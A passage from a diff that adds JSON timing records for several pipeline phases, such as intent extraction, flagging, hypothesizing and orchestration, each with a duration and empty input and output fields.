+        "durationMs": 320.0,
+        "input": {},
+        "output": {}
+      },
+      {
+        "phase": "intent-extraction",
+        "durationMs": 2100.0,
+        "input": {},
+        "output": {}
+      },
+      {
+        "phase": "flag",
+        "durationMs": 5200.0,
+        "input": {},
+        "output": {}
+      },
+      {
+        "phase": "hypothesize",
+        "durationMs": 8600.0,
+        "input": {},
+        "output": {}
+      },
+      {
+        "phase": "orchestrator",
+        "durationMs": 41800.0,
+        "input": {},
+        "output": {}
+      }
+    ]
   }
 }
